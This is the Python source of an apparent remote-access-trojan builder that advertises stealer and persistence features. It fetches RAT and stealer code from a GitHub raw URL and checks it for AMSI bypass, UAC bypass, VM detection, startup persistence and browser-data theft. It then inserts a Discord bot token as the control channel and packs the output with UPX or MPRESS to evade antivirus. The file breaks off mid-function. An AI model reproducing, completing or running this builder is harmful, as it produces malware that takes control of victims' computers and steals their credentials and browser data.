import hashlib
import os
import random
import shutil
import subprocess
import sys
import requests
import platform
from colorama import init, Fore, Style
import base64
import time
import winreg
import wmi
import zipfile
import traceback
import re

init()

def print_banner():
    banner = f"""
    {Fore.MAGENTA}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
    {Fore.MAGENTA}┃  {Fore.CYAN}⋆｡°✩ {Fore.YELLOW}Exotically Flexing RAT Builder{Fore.CYAN} ✩°｡⋆     {Fore.MAGENTA}                              ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}ₓ˚. ୭ ˚○◦˚.˚◦○˚ ୧ .˚ₓ{Fore.MAGENTA}                                                      ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}(/ /)     {Fore.YELLOW}Created with love by{Fore.MAGENTA}                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}(^.^)     {Fore.YELLOW}dead exotic & hoa{Fore.MAGENTA}                                                ┃ 
    {Fore.CYAN}┃  c(")(")   {Fore.YELLOW}https://github.com/deadexotic{Fore.MAGENTA}                                    ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}✿ {Fore.CYAN}Features:{Fore.CYAN} ✿ {Fore.MAGENTA}                                                             ┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Remote Access Control                                                    {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Discord Integration                                                      {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Stealer Capabilities                                                     {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Custom Icon Support                                                      {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃  {Fore.YELLOW}❀ Registry Persistence                                                     {Fore.MAGENTA}┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}(◡ ω ◡){Fore.MAGENTA}                                                                    ┃
    {Fore.MAGENTA}┃                                                                             ┃
    {Fore.MAGENTA}┃  {Fore.CYAN}✧･ﾟ: *✧･ﾟ:* {Fore.YELLOW}Let's build something amazing!{Fore.CYAN} *:･ﾟ✧*:･ﾟ✧{Fore.MAGENTA}                      ┃
    {Fore.MAGENTA}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    """
    print(banner)

def check_requirements():
    required_modules = [
        'discord.py>=2.3.2',
        'pycaw>=20230407',
        'comtypes>=1.2.0', 
        'requests>=2.31.0',
        'pyinstaller>=6.1.0',
        'colorama>=0.4.6',
        'mss>=9.0.1',
        'pynput>=1.7.6',
        'pyautogui>=0.9.54',
        'browserhistory>=0.1.3',
        'pywin32>=306',
        'pillow>=10.1.0',
        'psutil>=5.9.6',
        'cryptography>=41.0.5',
        'opencv-python>=4.8.1.78',
        'pyperclip>=1.8.2',
        'aiohttp>=3.8.5',
        'py-cpuinfo>=9.0.0',
        'wheel>=0.41.3'
    ]
    
    standard_modules = [
        'socket', 'json', 'base64', 're', 'shutil', 'platform', 
        'threading', 'subprocess', 'datetime', 'zipfile', 'asyncio',
        'ctypes', 'os', 'sys', 'random', 'time', 'urllib.request'
    ]
    
    missing_modules = []
    
    for module in required_modules:
        try:
            module_name = module.split('>=')[0].split('==')[0].strip()
            if module_name == 'discord.py':
                __import__('discord')
            elif module_name in standard_modules:
                continue
            elif module_name in ['pywin32', 'win32gui', 'win32con', 'win32process']:
                try:
                    import win32api
                except ImportError:
                    missing_modules.append('pywin32')
            else:
                __import__(module_name)
        except ImportError:
            module_name = module.split('>=')[0].split('==')[0].strip()
            if module_name not in missing_modules and module_name not in standard_modules:
                missing_modules.append(module_name)
    
    if missing_modules:
        print(f"{Fore.CYAN}[✿] Missing required modules: {', '.join(missing_modules)}")
        install = input(f"{Fore.YELLOW}[❀] Would you like to install them now? (y/n): {Style.RESET_ALL}")
        if install.lower() == 'y':
            for module in missing_modules:
                print(f"{Fore.CYAN}[✧] Installing {module}...{Style.RESET_ALL}")
                subprocess.run([sys.executable, "-m", "pip", "install", module, "--no-warn-script-location"], check=False)
            print(f"{Fore.GREEN}[✿] All modules installed successfully! {Fore.CYAN}(｡♥‿♥｡){Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[✗] Please install the required modules and try again.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[✧] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return False
    return True

def check_curl():
    try:
        subprocess.run(["curl", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        return True
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[!] curl not found on your system.{Style.RESET_ALL}")
        if platform.system() == "Windows":
            install = input(f"{Fore.YELLOW}[?] Do you want to install curl? (y/n): {Style.RESET_ALL}")
            if install.lower() == 'y':
                try:
                    print(f"{Fore.CYAN}[*] Attempting to install curl using winget...{Style.RESET_ALL}")
                    subprocess.run(["winget", "install", "curl"], check=False)
                    return True
                except FileNotFoundError:
                    print(f"{Fore.RED}[!] Could not install curl automatically.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[i] Will use Python requests module instead.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[i] Will use Python requests module instead.{Style.RESET_ALL}")
        return False

def validate_rat_source():
    """Validates that the rat_source.py file is complete and usable"""
    try:
        print(f"{Fore.CYAN}[*] Validating downloaded RAT source code...{Style.RESET_ALL}")
        
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py file not found{Style.RESET_ALL}")
            return False
            
        # Check file size - should be at least 10KB
        if os.path.getsize("rat_source.py") < 10240:
            print(f"{Fore.RED}[!] RAT source file seems incomplete (too small - less than 10KB){Style.RESET_ALL}")
            return False
            
        # Check for important functions and classes that should be present
        content = safe_read_file("rat_source.py")
        if not content:
            print(f"{Fore.RED}[!] Could not read rat_source.py{Style.RESET_ALL}")
            return False
            
        required_patterns = [
            ("def bypass_amsi", "AMSI bypass function"),
            ("def check_virtual_machine", "VM detection function"),
            ("def add_to_startup", "Startup persistence function"),
            ("def uac_bypass", "UAC bypass function"),
            ("HELP_MENU", "Help menu content"),
            ("async def steal_browser_data", "Browser data stealing function"),
            ("client.run(token)", "Discord client initialization")
        ]
        
        missing_patterns = []
        for pattern, description in required_patterns:
            if pattern not in content:
                missing_patterns.append(f"{pattern} ({description})")
                
        if missing_patterns:
            print(f"{Fore.RED}[!] RAT source is missing critical components:{Style.RESET_ALL}")
            for missing in missing_patterns:
                print(f"{Fore.RED}    - {missing}{Style.RESET_ALL}")
            return False
            
        # Verify token variable exists
        if not re.search(r'token\s*=', content):
            print(f"{Fore.YELLOW}[!] Warning: token variable not found in source. Will be added.{Style.RESET_ALL}")
            
        # Try compiling the file to catch syntax errors
        try:
            compile(content, "rat_source.py", "exec")
            print(f"{Fore.GREEN}[+] RAT source code validated successfully!{Style.RESET_ALL}")
            return True
        except SyntaxError as e:
            print(f"{Fore.RED}[!] Syntax error in RAT source: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.RED}    Line {e.lineno}, column {e.offset}: {e.text.strip() if e.text else ''}{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error validating RAT source: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False

def download_rat_source():
    try:
        print(f"{Fore.CYAN}[*] Looking for RAT source code...{Style.RESET_ALL}")
        
        # First check if main.py exists as a local source option
        if os.path.exists("main.py"):
            try:
                print(f"{Fore.CYAN}[*] Found main.py, checking file size...{Style.RESET_ALL}")
                main_size = os.path.getsize("main.py")
                print(f"{Fore.CYAN}[*] main.py size: {main_size} bytes{Style.RESET_ALL}")
                
                if main_size < 10240:  # Less than 10KB
                    print(f"{Fore.YELLOW}[!] main.py seems too small ({main_size} bytes), might be incomplete{Style.RESET_ALL}")
                
                print(f"{Fore.CYAN}[*] Attempting to use main.py as source...{Style.RESET_ALL}")
                
                # Read the content first to ensure we're not copying an empty file
                with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
                    main_content = f.read()
                    
                if len(main_content) < 10240:  # Less than 10KB
                    print(f"{Fore.YELLOW}[!] main.py content seems too small ({len(main_content)} chars), might be incomplete{Style.RESET_ALL}")
                
                # Write to rat_source.py using our safe write function
                if safe_write_file("rat_source.py", main_content):
                    print(f"{Fore.GREEN}[+] Successfully copied main.py content to rat_source.py{Style.RESET_ALL}")
                    
                    if validate_rat_source():
                        print(f"{Fore.GREEN}[+] Successfully using main.py as RAT source code!{Style.RESET_ALL}")
                        return True
                    else:
                        print(f"{Fore.YELLOW}[!] main.py failed validation, will try downloading from GitHub...{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Failed to copy main.py content to rat_source.py{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error using main.py as source: {str(e)}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] main.py not found locally, will download from GitHub...{Style.RESET_ALL}")
        
        # Try downloading from GitHub repository
        url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaa"
        print(f"{Fore.CYAN}[*] Downloading RAT source code from GitHub...{Style.RESET_ALL}")
        
        # Try download up to 3 times
        max_attempts = 3
        for attempt in range(1, max_attempts + 1):
            try:
                print(f"{Fore.CYAN}[*] Download attempt {attempt}/{max_attempts}...{Style.RESET_ALL}")
                response = requests.get(url, timeout=15)
                
                if response.status_code == 200:
                    # Check if content seems valid (contains expected Python code)
                    content = response.text
                    content_size = len(content)
                    print(f"{Fore.CYAN}[*] Downloaded content size: {content_size} bytes{Style.RESET_ALL}")
                    
                    if content_size < 10240 or "import" not in content or "discord" not in content:
                        print(f"{Fore.RED}[!] Downloaded content seems invalid (too small or missing key elements){Style.RESET_ALL}")
                        
                        if attempt < max_attempts:
                            print(f"{Fore.YELLOW}[!] Retrying download...{Style.RESET_ALL}")
                            time.sleep(1)  # Add a short delay to avoid hammering the server
                            continue
                        else:
                            break
                    
                    # Write downloaded content to file
                    if safe_write_file("rat_source.py", content):
                        print(f"{Fore.GREEN}[+] RAT source code downloaded ({content_size} bytes)!{Style.RESET_ALL}")
                        
                        # Verify the file was written correctly
                        if os.path.exists("rat_source.py"):
                            actual_size = os.path.getsize("rat_source.py")
                            print(f"{Fore.CYAN}[*] Verifying file size: {actual_size} bytes{Style.RESET_ALL}")
                            
                            if actual_size < content_size * 0.9:  # If file is significantly smaller than content
                                print(f"{Fore.RED}[!] File appears to be truncated! Expected ~{content_size} bytes, got {actual_size}{Style.RESET_ALL}")
                                
                                # Try to use main.py as fallback immediately
                                if os.path.exists("main.py"):
                                    print(f"{Fore.YELLOW}[!] Trying main.py as immediate fallback due to truncation...{Style.RESET_ALL}")
                                    try:
                                        with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
                                            main_content = f.read()
                                        if safe_write_file("rat_source.py", main_content):
                                            print(f"{Fore.GREEN}[+] Successfully used main.py as fallback!{Style.RESET_ALL}")
                                            return validate_rat_source()
                                    except Exception as fallback_error:
                                        print(f"{Fore.RED}[!] Error using main.py as fallback: {str(fallback_error)}{Style.RESET_ALL}")
                        
                        # Validate the downloaded file
                        if validate_rat_source():
                            return True
                        else:
                            print(f"{Fore.RED}[!] Downloaded RAT source failed validation.{Style.RESET_ALL}")
                            
                            # If we have a main.py file, try it as a fallback
                            if os.path.exists("main.py"):
                                print(f"{Fore.YELLOW}[!] Falling back to using main.py as RAT source...{Style.RESET_ALL}")
                                try:
                                    with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
                                        main_content = f.read()
                                    if safe_write_file("rat_source.py", main_content):
                                        if validate_rat_source():
                                            print(f"{Fore.GREEN}[+] Successfully used main.py as fallback!{Style.RESET_ALL}")
                                            return True
                                except Exception as fallback_error:
                                    print(f"{Fore.RED}[!] Error using main.py fallback: {str(fallback_error)}{Style.RESET_ALL}")
                            
                            if attempt < max_attempts:
                                print(f"{Fore.YELLOW}[!] Retry attempt {attempt}/{max_attempts}...{Style.RESET_ALL}")
                                time.sleep(1)
                            else:
                                print(f"{Fore.RED}[!] All download attempts failed validation.{Style.RESET_ALL}")
                                return False
                    else:
                        print(f"{Fore.RED}[!] Failed to write downloaded content to file.{Style.RESET_ALL}")
                        if attempt < max_attempts:
                            print(f"{Fore.YELLOW}[!] Retrying download...{Style.RESET_ALL}")
                            time.sleep(1)
                        else:
                            return False
                else:
                    print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
                    if attempt < max_attempts:
                        print(f"{Fore.YELLOW}[!] Retry attempt {attempt}/{max_attempts} in 2 seconds...{Style.RESET_ALL}")
                        time.sleep(2)
                    else:
                        print(f"{Fore.RED}[!] All download attempts failed.{Style.RESET_ALL}")
                        break
            except Exception as download_error:
                print(f"{Fore.RED}[!] Error during download: {str(download_error)}{Style.RESET_ALL}")
                if attempt < max_attempts:
                    print(f"{Fore.YELLOW}[!] Retry attempt {attempt}/{max_attempts} in 2 seconds...{Style.RESET_ALL}")
                    time.sleep(2)
                else:
                    print(f"{Fore.RED}[!] All download attempts failed due to errors.{Style.RESET_ALL}")
        
        # Last resort: use main.py if all download attempts failed
        if os.path.exists("main.py"):
            print(f"{Fore.YELLOW}[!] All download attempts failed. Using main.py as last resort...{Style.RESET_ALL}")
            try:
                with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
                    main_content = f.read()
                    
                if len(main_content) < 10240:  # Less than 10KB
                    print(f"{Fore.YELLOW}[!] Warning: main.py content seems small ({len(main_content)} chars){Style.RESET_ALL}")
                    
                if safe_write_file("rat_source.py", main_content):
                    success = validate_rat_source()
                    if success:
                        print(f"{Fore.GREEN}[+] Successfully used main.py as RAT source after all download attempts failed!{Style.RESET_ALL}")
                    return success
                else:
                    print(f"{Fore.RED}[!] Failed to write main.py content to rat_source.py{Style.RESET_ALL}")
                    return False
            except Exception as final_error:
                print(f"{Fore.RED}[!] Error using main.py as final fallback: {str(final_error)}{Style.RESET_ALL}")
                
        print(f"{Fore.RED}[!] Could not obtain a valid RAT source. Build will likely fail.{Style.RESET_ALL}")
        return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error getting RAT source code: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False

def download_stealer_source():
    url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaa.bbbbbbbbbbbbbbbbbbbb"
    try:
        print(f"{Fore.CYAN}[*] Downloading Stealer source code...{Style.RESET_ALL}")
        response = requests.get(url)
        if response.status_code == 200:
            with open("stealer_source.py", "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"{Fore.GREEN}[+] Stealer source code downloaded successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Failed to download Stealer source code. Status code: {response.status_code}{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading Stealer source code: {str(e)}{Style.RESET_ALL}")
        return False

def safe_read_file(file_path, default_content="", encoding="utf-8"):
    """Safely read a file with proper error handling."""
    try:
        with open(file_path, "r", encoding=encoding, errors="ignore") as f:
            return f.read()
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Warning: Could not read file {file_path}: {str(e)}{Style.RESET_ALL}")
        return default_content

def safe_write_file(file_path, content, encoding="utf-8"):
    """Safely write to a file with proper error handling."""
    try:
        # Create directories if they don't exist
        os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
        
        # Write to a temporary file first, then rename to target file
        temp_file = file_path + ".tmp"
        with open(temp_file, "w", encoding=encoding, errors="ignore") as f:
            f.write(content)
        
        # If target file exists, create backup
        if os.path.exists(file_path):
            backup_file = file_path + ".bak"
            try:
                if os.path.exists(backup_file):
                    os.remove(backup_file)
                shutil.copy2(file_path, backup_file)
                print(f"{Fore.GREEN}[+] Created backup of {file_path} -> {backup_file}{Style.RESET_ALL}")
            except Exception as backup_error:
                print(f"{Fore.YELLOW}[!] Warning: Could not create backup of {file_path}: {str(backup_error)}{Style.RESET_ALL}")
        
        # Verify content length before writing
        if len(content) < 30720 and file_path.endswith('.py'):  # Less than 30KB for Python files
            print(f"{Fore.RED}[!] Warning: Content is suspiciously small ({len(content)} chars){Style.RESET_ALL}")
            
            # Check if original file exists and is larger
            if os.path.exists(file_path) and os.path.getsize(file_path) > len(content):
                print(f"{Fore.RED}[!] Keeping original file which is larger{Style.RESET_ALL}")
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                return False
                
            # Check if backup exists and is larger
            if os.path.exists(backup_file) and os.path.getsize(backup_file) > len(content):
                print(f"{Fore.YELLOW}[!] Restoring from backup which is larger{Style.RESET_ALL}")
                shutil.copy2(backup_file, file_path)
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                return False
                
            # Check if main.py exists as fallback for rat_source.py
            if file_path.endswith('rat_source.py') and os.path.exists('main.py'):
                main_size = os.path.getsize('main.py')
                if main_size > len(content):
                    print(f"{Fore.YELLOW}[!] Using main.py as fallback (size: {main_size} bytes){Style.RESET_ALL}")
                    shutil.copy2('main.py', file_path)
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
                    return True
        
        # Rename temporary file to target file
        if os.path.exists(temp_file):
            # Verify the temp file is not truncated before replacing
            temp_size = os.path.getsize(temp_file)
            if temp_size < 30720 and file_path.endswith('.py'):  # At least 30KB for Python files
                print(f"{Fore.RED}[!] Warning: Generated file is suspiciously small ({temp_size} bytes){Style.RESET_ALL}")
                
                if os.path.exists(file_path):
                    original_size = os.path.getsize(file_path)
                    if original_size > temp_size:
                        print(f"{Fore.RED}[!] Keeping existing file which is larger ({original_size} bytes){Style.RESET_ALL}")
                        os.remove(temp_file)
                        return False
                        
                # Last resort - check if main.py exists for rat_source.py
                if file_path.endswith('rat_source.py') and os.path.exists('main.py'):
                    main_size = os.path.getsize('main.py')
                    if main_size > temp_size:
                        print(f"{Fore.YELLOW}[!] Using main.py as fallback (size: {main_size} bytes){Style.RESET_ALL}")
                        shutil.copy2('main.py', file_path)
                        os.remove(temp_file)
                        return True
            
            # Perform actual file replacement
            try:
                if os.path.exists(file_path):
                    os.replace(temp_file, file_path)  # atomic on most platforms
                else:
                    os.rename(temp_file, file_path)
                
                # Verify final file size
                if os.path.getsize(file_path) < 30720 and file_path.endswith('.py'):  # At least 30KB for Python files
                    print(f"{Fore.RED}[!] Warning: Final file is suspiciously small ({os.path.getsize(file_path)} bytes){Style.RESET_ALL}")
                    
                    # Try to restore from backup if available
                    if os.path.exists(backup_file) and os.path.getsize(backup_file) > os.path.getsize(file_path):
                        print(f"{Fore.YELLOW}[!] Restoring from backup which is larger{Style.RESET_ALL}")
                        shutil.copy2(backup_file, file_path)
                    
                    # If rat_source.py is still small, try using main.py
                    if file_path.endswith('rat_source.py') and os.path.exists('main.py'):
                        if os.path.getsize('main.py') > os.path.getsize(file_path):
                            print(f"{Fore.YELLOW}[!] Using main.py as final fallback{Style.RESET_ALL}")
                            shutil.copy2('main.py', file_path)
                            return True
                    
                    return os.path.getsize(file_path) >= 30720  # Return success only if file is large enough
                    
                return True
            except Exception as replace_error:
                print(f"{Fore.RED}[!] Error replacing file: {str(replace_error)}{Style.RESET_ALL}")
                
                # Try direct write as last resort
                try:
                    with open(file_path, "w", encoding=encoding, errors="ignore") as f:
                        f.write(content)
                    print(f"{Fore.GREEN}[+] Direct write successful as fallback{Style.RESET_ALL}")
                    return True
                except Exception as direct_error:
                    print(f"{Fore.RED}[!] Direct write failed: {str(direct_error)}{Style.RESET_ALL}")
                    return False
        return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error writing to file {file_path}: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False
def insert_token(token):
    """Insert the token into the rat_source.py file."""
    try:
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py not found. Cannot insert token.{Style.RESET_ALL}")
            return False
            
        # Create backup of original file
        backup_file = "rat_source.py.bak"
        shutil.copy2("rat_source.py", backup_file)
            
        # Check file size before modification
        original_size = os.path.getsize("rat_source.py")
        if original_size < 30720:  # Less than 30KB
            print(f"{Fore.YELLOW}[!] Warning: rat_source.py is suspiciously small ({original_size} bytes){Style.RESET_ALL}")
            
            # Try to use main.py instead if it exists and is larger
            if os.path.exists("main.py") and os.path.getsize("main.py") > original_size:
                print(f"{Fore.YELLOW}[!] main.py is larger, using it instead{Style.RESET_ALL}")
                with open("main.py", "r", encoding="utf-8", errors="ignore") as f:
                    main_content = f.read()
                if not safe_write_file("rat_source.py", main_content):
                    print(f"{Fore.RED}[!] Failed to replace with main.py content{Style.RESET_ALL}")
                    return False
        
        # Read the entire file content
        with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            
        # Check content length
        if len(content) < 30720:  # Less than 30KB
            print(f"{Fore.YELLOW}[!] Warning: rat_source.py content is suspiciously small ({len(content)} chars){Style.RESET_ALL}")
        
        # Sanitize token - remove any quotes that might cause issues
        token = token.replace("'", "").replace('"', "")
        
        # Create new file with token
        new_content = f"""token = '{token}'  # Discord bot token

{content}"""
        # Look for specific insertion points
        token_replaced = False
        
        # First approach: Look for existing token line
        lines = content.splitlines()
        token_line = f"token = '{token}'  # Discord bot token"
        
        for i, line in enumerate(lines):
            if re.search(r'token\s*=', line):
                lines[i] = token_line
                token_replaced = True
                print(f"{Fore.GREEN}[+] Token inserted at existing token line{Style.RESET_ALL}")
                break
                
        # Second approach: Insert after appdata line
        if not token_replaced:
            for i, line in enumerate(lines):
                if "appdata = os.getenv" in line:
                    lines.insert(i+1, token_line)
                    token_replaced = True
                    print(f"{Fore.GREEN}[+] Token inserted after appdata declaration{Style.RESET_ALL}")
                    break
                    
        # Third approach: Insert after client declaration
        if not token_replaced:
            for i, line in enumerate(lines):
                if "client = discord.Client" in line:
                    lines.insert(i+1, token_line)
                    token_replaced = True
                    print(f"{Fore.GREEN}[+] Token inserted after client declaration{Style.RESET_ALL}")
                    break
                    
        # Last resort: Insert at beginning of file
        if not token_replaced:
            lines.insert(20, token_line)  # Insert after some imports
            token_replaced = True
            print(f"{Fore.GREEN}[+] Token inserted near beginning of file{Style.RESET_ALL}")
            
        # Reconstruct the content
        modified_content = "\n".join(lines)
        
        # Write the modified content back to the file
        result = safe_write_file("rat_source.py", modified_content)
        # Verify the file was written correctly
        if result and os.path.exists("rat_source.py"):
            new_size = os.path.getsize("rat_source.py")
            if new_size < original_size * 0.9 and original_size > 30720:
                print(f"{Fore.RED}[!] Warning: File size decreased significantly after token insertion!{Style.RESET_ALL}")
                print(f"{Fore.RED}[!] Original: {original_size} bytes, New: {new_size} bytes{Style.RESET_ALL}")
                
                # Try a different approach - just append the token
                with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                
                modified_content = content + f"\n\n# Token added by builder\ntoken = '{token}'\n"
                return safe_write_file("rat_source.py", modified_content)
        
        return result
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting token: {str(e)}{Style.RESET_ALL}")
        # Fallback method - direct append
        try:
            with open("rat_source.py", "a", encoding="utf-8", errors="ignore") as f:
                f.write(f"\n\n# Emergency token insertion\ntoken = '{token}'\n")
            return True
        except:
            return False

def install_packers():
    import zipfile
    
    print(f"{Fore.CYAN}[*] Checking for packers...{Style.RESET_ALL}")
    
    try:
        result = subprocess.run(["upx", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        if result.returncode == 0:
            print(f"{Fore.GREEN}[+] UPX is already installed{Style.RESET_ALL}")
        else:
            raise Exception("UPX not available")
    except:
        print(f"{Fore.YELLOW}[!] UPX not found, installing...{Style.RESET_ALL}")
        try:
            if os.name == 'nt':
                url = "https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip"
                print(f"{Fore.CYAN}[*] Downloading UPX from {url}{Style.RESET_ALL}")
                r = requests.get(url, timeout=30)
                
                if r.status_code != 200:
                    print(f"{Fore.RED}[!] Failed to download UPX: HTTP {r.status_code}{Style.RESET_ALL}")
                    return
                
                with open("upx.zip", "wb") as f:
                    f.write(r.content)
                
                if not os.path.exists("upx-extract"):
                    os.makedirs("upx-extract")
                
                with zipfile.ZipFile("upx.zip", 'r') as zip_ref:
                    zip_ref.extractall("upx-extract")
                
                upx_exe_path = None
                for root, dirs, files in os.walk("upx-extract"):
                    for file in files:
                        if file == "upx.exe":
                            upx_exe_path = os.path.join(root, file)
                            break
                    if upx_exe_path:
                        break
                
                if upx_exe_path:
                    shutil.copy(upx_exe_path, "upx.exe")
                    os.environ["PATH"] += os.pathsep + os.path.abspath(".")
                    print(f"{Fore.GREEN}[+] UPX installed successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Could not find upx.exe in the extracted files{Style.RESET_ALL}")
                
                try:
                    os.remove("upx.zip")
                    shutil.rmtree("upx-extract", ignore_errors=True)
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Warning: Could not clean up UPX files: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}[*] Attempting to install UPX using system package manager{Style.RESET_ALL}")
                try:
                    subprocess.run(["sudo", "apt-get", "install", "-y", "upx-ucl"], check=False)
                except:
                    try:
                        subprocess.run(["sudo", "apt-get", "install", "-y", "upx"], check=False)
                    except:
                        print(f"{Fore.RED}[!] Failed to install UPX using package manager{Style.RESET_ALL}")
            
            try:
                result = subprocess.run(["upx", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
                if result.returncode == 0:
                    print(f"{Fore.GREEN}[+] UPX verified successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] UPX installation couldn't be verified but continuing anyway{Style.RESET_ALL}")
            except:
                print(f"{Fore.YELLOW}[!] UPX installation couldn't be verified but continuing anyway{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to install UPX: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Continuing without UPX...{Style.RESET_ALL}")

    try:
        result = subprocess.run(["mpress", "-?"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        if result.returncode == 0 or "mpress" in result.stdout.decode().lower() or "mpress" in result.stderr.decode().lower():
            print(f"{Fore.GREEN}[+] MPRESS is already installed{Style.RESET_ALL}")
        else:
            raise Exception("MPRESS not available")
    except:
        print(f"{Fore.YELLOW}[!] MPRESS not found, installing...{Style.RESET_ALL}")
        try:
            if os.name == 'nt':
                urls = [
                    "https://www.autoitscript.com/autoit3/files/beta/autoit/archive/mpress-225.zip",
                    "https://github.com/matcode/mpress/releases/download/v2.19/mpress-219.zip",
                    "https://ntcore.com/files/mpress_x64.zip"
                ]
                
                success = False
                for url in urls:
                    try:
                        print(f"{Fore.CYAN}[*] Downloading MPRESS from {url}{Style.RESET_ALL}")
                        r = requests.get(url, timeout=30)
                        
                        if r.status_code == 200:
                            success = True
                            break
                    except:
                        continue
                
                if not success:
                    print(f"{Fore.RED}[!] Failed to download MPRESS from any source{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[!] Continuing without MPRESS...{Style.RESET_ALL}")
                    return
                
                with open("mpress.zip", "wb") as f:
                    f.write(r.content)
                
                if not os.path.exists("mpress-extract"):
                    os.makedirs("mpress-extract")
                
                with zipfile.ZipFile("mpress.zip", 'r') as zip_ref:
                    zip_ref.extractall("mpress-extract")
                
                mpress_exe_path = None
                for root, dirs, files in os.walk("mpress-extract"):
                    for file in files:
                        if file.lower() == "mpress.exe":
                            mpress_exe_path = os.path.join(root, file)
                            break
                    if mpress_exe_path:
                        break
                
                if mpress_exe_path:
                    shutil.copy(mpress_exe_path, "mpress.exe")
                    os.environ["PATH"] += os.pathsep + os.path.abspath(".")
                    print(f"{Fore.GREEN}[+] MPRESS installed successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Could not find mpress.exe in the extracted files{Style.RESET_ALL}")
                
                try:
                    os.remove("mpress.zip")
                    shutil.rmtree("mpress-extract", ignore_errors=True)
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Warning: Could not clean up MPRESS files: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] MPRESS is only available for Windows{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to install MPRESS: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Continuing without MPRESS...{Style.RESET_ALL}")

def pack_executable(exe_path, packer=None):
    if not packer:
        return
        
    print(f"{Fore.CYAN}[*] Packing executable with {packer}...{Style.RESET_ALL}")
    
    try:
        if packer == "upx":
            print(f"{Fore.YELLOW}[!] Warning: UPX packing may increase detection rates{Style.RESET_ALL}")
            upx_path = "upx"
            if os.path.exists("upx.exe"):
                upx_path = os.path.abspath("upx.exe")
            
            print(f"{Fore.CYAN}[*] Running UPX packer: {upx_path} --best {exe_path}{Style.RESET_ALL}")
            result = subprocess.run([upx_path, "--best", exe_path], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE,
                                   check=False)
            
            if result.returncode == 0:
                print(f"{Fore.GREEN}[+] Executable packed successfully with UPX!{Style.RESET_ALL}")
            else:
